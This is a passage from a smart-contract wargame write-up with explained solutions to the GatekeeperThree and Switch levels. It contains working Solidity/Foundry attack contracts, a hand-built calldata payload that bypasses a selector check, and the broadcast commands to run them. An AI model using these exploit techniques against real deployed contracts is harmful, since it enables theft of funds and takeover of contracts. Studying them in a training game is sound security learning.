</span><span>        trick</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">trickInit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">enter</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> gateOne gateTwo gateThree </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        entrant </span><span class="token" style="color:#d4d4d4">=</span><span> tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Cope with gates and become an entrant.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the <code>enter()</code> function.</li>
<li><code>gateOne()</code> can be bypassed if we are the owner of the contract and we need call from a contract.</li>
<li>To be be the owner we can call the <code>construct0r()</code> function its not the actual constructor(), so we can be the owner after calling it.</li>
<li><code>gateTwo()</code> will be passed if we managed to change the <code>allowEntrance</code> value to true. To do it, we need to call the <code>getAllowance()</code> function with the right password defined inside SimpleTrick contract.</li>
<li>So, we need to deploy a SimpleTrick contract first, we can do this by calling <code>createTrick()</code> function.</li>
<li>After that we need to find the password stored inside SimpleTrick contract. We can do this by using <code>vm.load</code> cheatcode or we can find the password inside our Attack contract.</li>
<li>Because the password is the <code>block.timestamp</code> which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.</li>
<li>Callling <code>getAllowance()</code> with this value will pass the gateTwo.</li>
<li>For <code>gateThree()</code> the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.</li>
<li>Remember owner is out attack contract, GatekeeperThree sending ether using <code>send</code> call. <code>send</code> call will return <code>false</code> when the transaction fails.</li>
<li>So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven’t implemented any fallback or receive function inside my Attack contract.</li>
<li>For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.</li>
</ol>
<p><strong>Level28Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level28.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level28Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    GatekeeperThree </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">GatekeeperThree</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x1B3158cc2634Fbf84299D79D52a2E63680B63559</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Gate Owner : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        Attack attack </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">0.009</span><span> ether</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        attack</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Allow Entrance : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">allowEntrance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Gate keeper Owner : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">owner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Entrant : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">entrant</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    GatekeeperThree </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">GatekeeperThree</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x1B3158cc2634Fbf84299D79D52a2E63680B63559</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">construct0r</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span class="token" style="color:#6a9955">//bypassed first gate</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">//bypassing second gate</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">createTrick</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// uint256 password = vm.getBlockTimestamp();</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">getAllowance</span><span class="token" style="color:#d4d4d4">(</span><span>block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>call</span><span class="token" style="color:#d4d4d4">{</span><span>value </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Tx Failed&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">enter</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level28Solution.s.sol:Level28Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Switch</h2>
<p><strong>Level29.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Switch</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> switchOn</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// switch is off</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bytes4</span><span> </span><span class="token" style="color:#569CD6">public</span><span> offSelector </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">bytes4</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;turnSwitchOff()&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">onlyThis</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Only the contract can call this&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">onlyOff</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// we use a complex data type to put in memory</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> selector</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// check that the calldata at position 68 (location of _data)</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">assembly</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#dcdcaa">calldatacopy</span><span class="token" style="color:#d4d4d4">(</span><span>selector</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">68</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">4</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#6a9955">// grab function selector from calldata</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>selector</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> offSelector</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Can only call the turnOffSwitch function&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">flipSwitch</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _data</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOff </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> success</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">call</span><span class="token" style="color:#d4d4d4">(</span><span>_data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;call failed :(&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">turnSwitchOn</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyThis </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        switchOn </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">turnSwitchOff</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyThis </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        switchOn </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Just have to flip the switch.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>Switch contract has three functions <code>turnSwitchOff()</code>, <code>turnSwitchOn()</code> and <code>flipSwitch()</code>. We can only able to call flipSwitch function.</li>
<li>By using this flipSwitch only we have to call the <code>turnSwitchOn()</code> function. For this we need to pass the calldata for the function call <code>turnSwitchOn()</code>.</li>
<li>But If we pass the <code>turnSwitchOn()</code> calldata to the <code>flipSwitch()</code> it will be reverted by <code>onlyOff</code> modifier.</li>
<li>Because, onlyOff is checking that the calldata’s 68 to 72 bytes should only contain the signature of the <code>turnSwitchOff()</code> function.</li>
<li>The vulnerability is present inside the <code>onlyOff()</code> modifier as its function signature check byte position is hardcoded (68,4).</li>
<li>We can modify the <code>calldata</code> in order to bypass the check and as well as call the <code>turnSwitchOn()</code> function.</li>
<li>When we call a function on a contract, the <code>calldata</code> will be sent via the transaction as <code>msg.data.</code></li>
<li>Now, we have to send the <code>turnSwitchOn()</code> signature along with this <code>calldata</code>. And we should make sure that only <code>turnSwitchOn()</code> signature should be passed to the <code>call</code> inside <code>flipSwitch()</code>.</li>
<li>The data which is used inside the function will be specified by the <code>offset</code>. The function will make use of the actual data that is pointed by the offset.</li>
<li>As the <code>onlyOff</code> modifier uses the hardcoded check, we can modify the calldata to be able to insert the <code>turnSwitchOff()</code> function signature at the 68th bytes and append the <code>turnSwitchOn()</code> signature.</li>
<li>Now we have to change the offset of the calldata in such a way that it points to the <code>turnSwitchOn()</code> signature.</li>
</ol>
<pre><code>calldata to bypass onlyOff
  =&gt; &lt;flipSwitch Singature&gt; &lt;Offset&gt; &lt;Dummy Data&gt; &lt;turnSwitchOff Signature&gt; &lt;length of data&gt; &lt;turnSwitchOn Signature&gt;

  30c13ade - flipSwitch(bytes)

[000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data
[020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check
[040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier
[060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data
[080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge
</code></pre>
<p>12.Now this <code>calldata</code> will bypasses the check of <code>onlyOff</code> and we modified the offset to point it to the <code>turnSwitchOn()</code> signature.</p>
<p>13.This will call the <code>turnSwitchOn()</code> function in Switch contract.</p>
<p><strong>Level29Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX- License-Identifier :MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level29.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level29Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Switch </span><span class="token" style="color:#569CD6">public</span><span> instance  </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Switch</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xBAfeeF31f97943fe11de5a04138f1AED8297aBb6</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> data </span><span class="token" style="color:#d4d4d4">=</span><span> abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;flipSwitch(bytes)&quot;</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">0x60</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>         </span><span class="token" style="color:#b5cea8">0x00</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0x20606e1500000000000000000000000000000000000000000000000000000000</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">0x04</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>         </span><span class="token" style="color:#b5cea8">0x76227e1200000000000000000000000000000000000000000000000000000000</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">logBytes</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>         </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">call</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>         </span><span class="token" style="color:#6a9955">/*
</span><span class="token" style="color:#6a9955">
</span><span class="token" style="color:#6a9955">         -----------------------------------------------console.log(data)----------------------------------------
</span><span class="token" style="color:#6a9955">          Possible methods:
</span><span class="token" style="color:#6a9955">            30c13ade      - flipSwitch(bytes)
</span><span class="token" style="color:#6a9955">            ------------
</span><span class="token" style="color:#6a9955">            [000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data
